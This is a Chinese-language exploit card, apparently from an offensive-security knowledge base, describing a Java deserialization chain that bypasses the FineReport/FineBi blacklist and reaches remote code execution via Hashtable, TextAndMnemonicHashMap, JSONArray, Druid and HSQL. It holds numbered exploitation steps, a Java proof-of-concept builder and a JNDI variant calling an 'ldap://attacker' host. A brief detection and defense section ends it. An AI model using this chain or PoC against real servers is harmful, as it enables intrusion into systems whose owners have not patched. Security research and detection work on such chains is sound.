---
id: web-java-deserialization-finereport-hashtable-textandmnemonic-jsonarray-druid-hsql
title: 帆软反序列化绕黑名单：Hashtable/TextAndMnemonicHashMap 触发 JSONArray→Druid→HSQL 二次反序列化 RCE
type: scenario
domain: web
path: web/java/deserialization
technique: finereport-textandmnemonic-jsonarray-druid-hsql-secondary
tags:
- java
- deserialization
- gadget
- finereport
- finebi
- hashtable
- textandmnemonichashmap
- jsonarray
- jackson
- druid
- hsqldb
- secondary-deserialization
- blacklist-bypass
- templatesimpl
- rce
cve: []
severity: critical
confidence: high
status: verified
affected_versions: 帆软 FineReport V10 全版本（2024-05 更新前）；FineBi（原文未标注具体版本区间）
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V279
  verified_at: '2026-11-07T23:57:45+08:00'
  notes: 已对照原文核对：外层 Hashtable→AbstractMap.equals→TextAndMnemonicHashMap.get（value==null→key.toString）→JSONArray.toString→EmbedJson.encode→Jackson→DruidXADataSource→HSQL CALL SerializationHelper.deserialize 的整条链与 img/04-12 的源码/调试截图一致；JNDI CALL InitialContext.doLookup（img/01）与 DruidDataSource 封装（img/02/03）作为变体/前置写明；TemplatesImpl 验证（img/05）与最终 getPayload2 弹计算器（img/12）一致。该卡是单一链条（一个外层触发接一个二次反序列化 sink），非并列多技术，属原子卡；PoC 为伪代码未在本机执行。affected_versions 按原文『5月更新前全版本 v10 及 FineBi』填写。dedup 首位为自身，其余为不同反序列化入口/链，非重复。
url: /docs/web/java/deserialization/web-java-deserialization-finereport-hashtable-textandmnemonic-jsonarray-druid-hsql/
draft: false
kb_aliases:
- 帆软 TextAndMnemonicHashMap 链
- Hashtable 触发 JSONArray toString
- FineReport HSQL 二次反序列化
- EmbedJson writeValueAsString getter
- DruidXADataSource HSQL CALL
- 帆软黑名单绕过
---

## 一句话结论

FineReport/FineBi 的黑名单封禁 `SignedObject` 与大量常见 toString/反序列化类后，仍可用 JDK 自带的 `Hashtable` + `javax.swing.UIDefaults$TextAndMnemonicHashMap` 触发 `com.fr.json.JSONArray.toString`，经 `EmbedJson.encode` 的 Jackson `writeValueAsString` 调用 `DruidXADataSource` getter，初始化 HSQL 连接并执行 `CALL ...SerializationHelper.deserialize(X'<hex>')`，完成第二段反序列化，最终 RCE。

## 原理

- **黑名单背景**：FineReport 的反序列化黑名单位于 `fine-core-10.0.jar!/com/fr/serialization/blacklist.txt`，上一大版本已封禁 `java.security.SignedObject` 及多数公开利用类，直接反序列化 `TemplatesImpl`、`SignedObject` 等不可行，需要新的“外层触发 → 业务 getter → JDBC → 二次反序列化”组合。
- **外层 toString 触发（JDK 类）**：`Hashtable.readObject` 重建哈希表时调用 `reconstitutionPut`；桶内已有同 hash 的 key 时执行 `e.key.equals(key)`。把两个 `TextAndMnemonicHashMap` 作为 Hashtable 的 key，且二者哈希相同，`equals` 进入 `AbstractMap.equals`，遍历 entry 调用 `m.get(key)`；`TextAndMnemonicHashMap.get(Object key)` 在 `super.get(key)==null` 时执行 `key.toString()`，从而触发攻击者放入的 `JSONArray.toString()`。
- **关键构造顺序**：`Hashtable.put` 时两个 map 的 value 必须非空（如 `"yy"`、`"zZ"`），否则 `AbstractMap.equals` 不会走到比较分支；`hashtable.put` 完成后，再把两个 map 中同一 key 的 value 置为 `null`，使反序列化时 `get` 返回 null 并进入 `toString` 分支。
- **JSONArray → Jackson getter**：`com.fr.json.JSONArray.toString()` → `encode()` → `com.fr.json.revise.EmbedJson.encode()` → `MAPPER.writeValueAsString(obj)`。Jackson 序列化 `ArrayList` 中的对象时会调用 getter；把 `DruidXADataSource` 放进 ArrayList 再放进 JSONArray，即触发 `getXAConnection()/getConnection()`。
- **Druid → HSQL 二次反序列化**：Druid 初始化连接时执行 `validationQuery`。URL 设为 `jdbc:hsqldb:mem:myDbName`，驱动为 `com.fr.third.org.hsqldb.jdbc.JDBCDriver`；validationQuery 设为 `CALL "org.terracotta.modules.ehcache.collections.SerializationHelper.deserialize"(X'<hex>')`。HSQL 的 `CALL` 可反射调用任意 public static 方法，`SerializationHelper.deserialize` 内部执行 `ObjectInputStream.readObject()`，对第二段 payload 再反序列化，落到 TemplatesImpl/内存马/TomcatEcho 等 sink。
- **序列化工程细节**：`DruidDataSource` 含不可序列化字段（如 `PrintWriter`），需 `setInitialSize(1)`、`setLogWriter(null)`、`setStatLogger(null)`，并通过反射把父类 `transactionHistogram`、`initedLatch` 置 null，否则 `NotSerializableException`。
- **为什么成立**：黑名单是类名黑名单，只覆盖已知入口；`Hashtable`/`TextAndMnemonicHashMap` 是 JDK 类，`JSONArray`/`EmbedJson`/Druid/HSQL 是 FineReport 自带依赖，组合后每个环节都“合法”，直到 HSQL 执行 `CALL` 才落地第二段任意反序列化。

## 触发条件

- 目标为帆软 FineReport V10（2024-05 更新前全版本）或 FineBi，存在可提交 Java 原生序列化数据的入口（如报表/设计器通信接口，具体入口按目标版本确认）。
- classpath 含 FineReport 内置 HSQLDB 驱动、Druid（`DruidXADataSource`）、ehcache 的 `org.terracotta.modules.ehcache.collections.SerializationHelper`、`com.fr.json.JSONArray`/`EmbedJson`、FineReport 重打包的 Jackson。
- 运行在含 Swing 的 JDK（`TextAndMnemonicHashMap` 位于 `javax.swing.UIDefaults`）。
- 黑名单未覆盖上述组合类；目标可加载 HSQL 内存库并执行连接初始化 SQL。

## 利用步骤

1. 生成第二段 payload（TemplatesImpl、内存马或 TomcatEcho）的 Java 序列化字节，转十六进制。
2. 构造 `DruidXADataSource`：driver 为 `com.fr.third.org.hsqldb.jdbc.JDBCDriver`，url 为 `jdbc:hsqldb:mem:myDbName`，用户名 `sa`、口令任意；`validationQuery` 设为 `CALL "org.terracotta.modules.ehcache.collections.SerializationHelper.deserialize"(X'<hex>')`；`setInitialSize(1)`、`setLogWriter(null)`、`setStatLogger(null)`，反射将 `transactionHistogram`、`initedLatch` 置 null。
3. 把 Druid 数据源放入 `ArrayList`，再把该 List 放入 `com.fr.json.JSONArray`。
4. 用反射创建两个 `javax.swing.UIDefaults$TextAndMnemonicHashMap`，分别 `put(jsonArray, "yy")`、`put(jsonArray, "zZ")`；构造 `Hashtable`，把两个 map 作为 key 放入；最后把两个 map 中 `jsonArray` 的 value 置 null。
5. 序列化 `Hashtable`，按入口要求封装（如 Gzip）并发送到反序列化入口。
6. 反序列化触发 `toString → Jackson getter → Druid 初始化 → HSQL CALL`，第二段 payload 执行；用计算器或回连验证后停止。

## PoC

```java
// 第二段 payload 的十六进制（TemplatesImpl/内存马等）
String hex = "<serialized-gadget-hex>";

DruidXADataSource ds = new DruidXADataSource();
ds.setUrl("jdbc:hsqldb:mem:myDbName");
ds.setDriverClassName("com.fr.third.org.hsqldb.jdbc.JDBCDriver");
ds.setUsername("sa");
ds.setPassword("1");
ds.setValidationQuery(
    "CALL \"org.terracotta.modules.ehcache.collections.SerializationHelper.deserialize\"(X'" + hex + "')");
ds.setInitialSize(1);
ds.setLogWriter(null);
ds.setStatLogger(null);
// 反射清空不可序列化字段
setField(ds, "transactionHistogram", null);
setField(ds, "initedLatch", null);

List<Object> list = new ArrayList<>();
list.add(ds);
com.fr.json.JSONArray jsonArray = new com.fr.json.JSONArray();
jsonArray.add(list);

Class<?> clazz = Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap");
Constructor<?> ctor = clazz.getDeclaredConstructor();
ctor.setAccessible(true);
HashMap<Object, Object> m1 = (HashMap<Object, Object>) ctor.newInstance(null);
HashMap<Object, Object> m2 = (HashMap<Object, Object>) ctor.newInstance();
m1.put(jsonArray, "yy");
m2.put(jsonArray, "zZ");

Hashtable<Object, Object> hashtable = new Hashtable<>();
hashtable.put(m1, 1);
hashtable.put(m2, 2);

// 关键：put 之后把 value 置空，反序列化时 get 才会 null → key.toString()
m1.put(jsonArray, null);
m2.put(jsonArray, null);

// Serialize.writeObject(hashtable, ...) 后按入口发送
```

调用链：

```text
Hashtable.readObject / reconstitutionPut
→ AbstractMap.equals
→ TextAndMnemonicHashMap.get (super.get == null)
→ JSONArray.toString
→ EmbedJson.encode → Jackson ObjectMapper.writeValueAsString
→ DruidXADataSource.getXAConnection / getConnection
→ HSQL CALL org.terracotta.modules.ehcache.collections.SerializationHelper.deserialize
→ ObjectInputStream.readObject(第二段 payload) → RCE
```

## 变体与关联

- 变体：HSQL `CALL` 也可换成 `javax.naming.InitialContext.doLookup('ldap://attacker/...')` 走 JNDI；高版本 JDK 可让 LDAP 直接返回序列化 gadget（如 CommonsBeanutils183NOCC）或使用受害本地 CLASSPATH 中的 Factory 类绕过。
- 变体：第二段 sink 可换内存马、TomcatEcho、TemplatesImpl；HSQL `CALL` 的静态方法也可换 c3p0 `parseUserOverridesAsString`、Spring `SerializationUtils.deserialize`。
- 关联：[[web-java-deserialization-jdk-hashtable-textandmnemonic-tostring]]（同一外层触发，原卡止于 `toString`，未接 FineReport 下游）、[[web-java-deserialization-immutablesetmultimap-usingtostring-jsonarray-hsql]] 与 [[web-java-deserialization-immutablesetmultimap-nullkey-checkentrynotnull-tostring]]（同一 JSONArray→DruidXADataSource→HSQL 下游链，入口分别为 Guava 的 `UsingToStringOrdering` 与 null-key `checkEntryNotNull`）、[[web-java-component-hsqldb-call-static-method-rce]]（HSQL CALL 静态方法原语与 JNDI/c3p0/Spring 变体）、[[web-java-deserialization-finereport-channel-gzip-safeinvocation]]（帆软投递入口）。
- 边界：黑名单后续版本封禁 `TextAndMnemonicHashMap`/`JSONArray`/Druid/HSQL；启用 JEP 290 类白名单；classpath 缺 Swing/HSQL/Druid；入口被修复时链断。

## 检测与防御

- 检测：反序列化流中出现 `Hashtable` + `TextAndMnemonicHashMap` + `JSONArray` + `DruidXADataSource` 组合；异常栈含 `AbstractMap.equals`、`TextAndMnemonicHashMap.get`、`JSONArray.toString`、`EmbedJson.encode`、`DruidDataSource.init`。
- 检测：应用进程出现 `jdbc:hsqldb:mem` 连接，`validationQuery` 含 `CALL`、`SerializationHelper.deserialize`、`InitialContext.doLookup`、`C3P0ImplUtils` 等特征；随后出现子进程或异常类加载。
- 防御：升级 FineReport/FineBi 到修复版本；启用 JEP 290 全局反序列化过滤器并采用允许类白名单；黑名单补充上述组合类；禁止应用加载任意 JDBC 驱动、限制 `validationQuery`/连接初始化 SQL；禁用 HSQL `CALL` 静态方法与 `CREATE ALIAS`。
- 加固：反序列化入口鉴权与来源限制；对报表/设计器通信做协议白名单；运行时监控 HSQL 内存库连接与异常反序列化类加载。
